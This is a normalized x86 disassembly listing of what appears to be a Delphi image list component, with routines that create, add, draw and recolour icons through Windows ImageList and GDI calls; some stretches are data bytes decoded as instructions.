je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45979c
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_459edc
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_45a3a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a4cc
mov edi eax
mov eax esi
call sub_45ce1c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_45a3d0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_45a414
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a439
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a440
retn
sub_45a474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc40045a4
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] dl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0xbb
inc ebp
add [ ecx ] al
add bh bh
[ eax - 0x45 ]
inc ebp
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
cmp [ ebp + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x45 ] bh
add [ ebp + 0x680045 ] al
add [ eax ] al
push eax
imul eax [ ecx ] sub_421138
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
inc ebp
add ah dh
mov al 0x45
add [ esp + esi * 4 + 0x45 ] bh
add [ eax + esi * 4 ] dh
inc ebp
add [ eax ] bl
push cs
inc edx
add ah ah
or al 0x42
add [ eax ] ch
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ esi ] al
inc ebp
add [ eax ] ch
lodsb [ esi ]
inc ebp
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax ] dh
mov ecx 0xb9bc0045
inc ebp
add [ edx + esi * 4 ] dh
inc ebp
add [ ecx ] al
add bh ch
inc [ edx + esi * 4 + 0x45 ]
add [ eax ] dl
push esp
inc ebx
jne r-xdata
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x9c00408d
movsd [ edi ] [ esi ]
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0x63a9e8c6 ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x2617f08c ] 0x8e
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
dec esp
push 0x41
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_45a604
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4209c8
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_45a650
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_4209c8
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_45a6a4
push ebx
push esi
push edi
call sub_403528
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418390
mov edx eax
mov eax edi
call sub_45b294
mov eax [ edi + 0x50 ]
call sub_403174
mov eax edi
call sub_45a968
mov eax [ edi + 0x4c ]
call sub_403174
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420a14
test bl bl
jle r-xdata
call sub_403174
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403510
sub_45a710
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45a7bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_45b21c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_45a7dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a7c4
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_45a7dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45a87d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_428250
mov eax ebx
call sub_427730
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424210
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416c50
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_427730
pop edx
call sub_4245fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a884
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45a8a0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_45a7dc
pop ecx
pop edx
pop ebx
retn
sub_45a8d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a968
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45a8a0
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403370
sub_45a914
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45b1a4
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_42779c
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a968
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403370
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_45a904
push eax
call ImageList_Destroy
sub_45a9a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45aa33
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45a7c8
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aa3a
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov edx eax
mov eax ebx
call sub_45abc8
sub_45aa40
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45aaef
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45aad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a7d0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a914
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a914
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aad9
mov eax [ ebp - 0x10 ]
call sub_403174
retn
sub_45ab0c
push ebx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45a904
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_45ab30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45abaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45ab0c
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax ebx
mov si 0xffef
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45abb6
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
push esi
mov eax ebx
call sub_45a904
push eax
call ImageList_Remove
sub_45abc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_45a5c4
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403370
pop esi
pop ebx
retn
sub_45ac00
push ebx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_45a904
push eax
call ImageList_GetBkColor
call sub_45a5e4
pop ebx
retn
sub_45ac28
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_45a5c4
push eax
mov eax ebx
call sub_45ac00
call sub_45a5c4
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_424a70
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45a904
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_427730
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424210
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_416c50
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_427730
pop edx
call sub_4245fc
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_427730
call sub_424a70
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45a904
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_416c50
mov eax [ ebx + 0x54 ]
call sub_427730
call sub_424a70
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424210
mov eax edi
call sub_424a70
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424210
mov eax edi
call sub_424a70
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4284a0
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_45adfc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_45ae20
pop ebx
pop ebp
retn 0xc
sub_45ae20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45ae6c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416c50
mov eax [ ebp - 0x4 ]
call sub_45bb00
xor eax eax
push ebp
push sub_45b005
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45afe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45afcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4284a0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45afd2
mov eax [ ebp - 0x10 ]
call sub_403174
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_427730
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4245fc
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_424a70
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_427730
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4245fc
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_424a70
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45aa40
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_45b014
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a904
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45ae6c
sub_45b034
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebx
call sub_45a968
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418b70
mov eax ebx
call sub_45abbc
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45b21c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_45a904
mov edx eax
mov eax ebx
call sub_45a8a0
mov eax ebx
call sub_45a7c8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45a904
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45a7d0
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a904
push eax
call ImageList_GetBkColor
call sub_45a5e4
mov edx eax
mov eax ebx
call sub_45abc8
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_45b014
jmp r-xdata
sub_45b0f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c54
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45b21c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_45abbc
mov eax esi
call sub_45a904
mov edx eax
mov eax ebx
call sub_45a8a0
mov eax ebx
call sub_45a7c8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45a904
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45a7d0
jmp r-xdata
mov eax esi
call sub_45a904
push eax
call ImageList_GetBkColor
call sub_45a5e4
mov edx eax
mov eax ebx
call sub_45abc8
mov edx esi
mov eax ebx
call sub_45b014
pop esi
pop ebx
retn
sub_45b1a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b210
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b217
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_45b244
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4182a8
mov si 0xffff
call sub_403370
inc ebp
dec edi
jne r-xdata
sub_45b294
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418198
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4182a8
cmp ebp eax
jne r-xdata
sub_45b2ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407d40
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45b330
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_45ab0c
mov ebx eax
mov eax edi
call sub_45ab0c
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_45ab0c
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b40c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b3ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45b2ec
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b3f6
mov eax [ ebp - 0xc ]
call sub_403174
retn
mov eax edi
call sub_45ab0c
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_45b420
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45ab0c
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45b330
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45b47c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_420d40
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_45b420
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b4d4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41acf0
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41acf0
mov dl 0x1
